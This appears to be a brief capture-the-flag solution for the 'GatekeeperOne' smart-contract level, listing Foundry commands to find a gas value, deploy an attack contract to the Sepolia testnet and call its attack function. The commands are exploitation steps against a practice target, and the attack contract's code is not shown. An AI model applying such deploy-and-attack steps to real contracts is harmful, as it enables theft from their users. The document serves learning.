# GatekeeperOne Solution

Comment out line 16 in `GatekeeperOneHack.t.sol`, uncomment line 17 and input the `instanceAddress`. Run to retrieve the `_gas`:

```bash
forge test --mt test_gateTwo --rpc-url $SEPOLIA_RPC_URL -vvv
# _gas 256
```

Deploy:

```bash
forge create GatekeeperOneHack --broadcast --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args <instanceAddress>
```

Run:

```bash
cast send <gatekeeperOneHackAddress> "attack(uint256)" <_gas> --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
# cast send <gatekeeperOneHackAddress> "attack(uint256)" 256 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
